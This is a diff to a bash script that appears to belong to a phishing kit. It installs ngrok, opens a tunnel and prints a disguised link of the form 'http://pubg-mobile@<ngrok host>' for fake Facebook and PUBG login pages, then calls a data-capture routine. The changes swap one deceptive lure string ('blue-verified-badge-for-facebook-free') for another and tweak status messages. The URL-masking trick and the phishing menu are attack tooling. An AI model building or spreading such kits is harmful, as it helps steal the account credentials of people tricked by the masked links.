@@ -129,7 +129,7 @@ install_ngrok() {
 	if [[ -e ".server/ngrok" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}Plz Wait${GREEN}]${CYAN} Installing ngrok..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip' 'ngrok'
@@ -145,7 +145,7 @@ install_ngrok() {
 	if [[ -e ".server/ngrok2" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok patch already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok patch..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}Plz Wait${GREEN}]${CYAN} Installing ngrok patch..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download_ngrok 'https://bin.equinox.io/a/e93TBaoFgZw/ngrok-2.2.8-linux-arm.zip' 'ngrok2'
@@ -253,7 +253,7 @@ start_ngrok() {
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mafia404@$ngrok_url1"
 	capture_data
 }
 
@@ -302,11 +302,11 @@ ${RED}[${WHITE}01${RED}]${ORANGE} link Editor
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		website="facebook"
-		mask='http://blue-verified-badge-for-facebook-free'
+		mafia404='http://pubg-mobile'
 		tunnel_menu
         elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
 	        website="Pubg"
-		mask='http://blue-verified-badge-for-facebook-free'
+		mafia404='http://pubg-mobile'
 		tunnel_menu
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
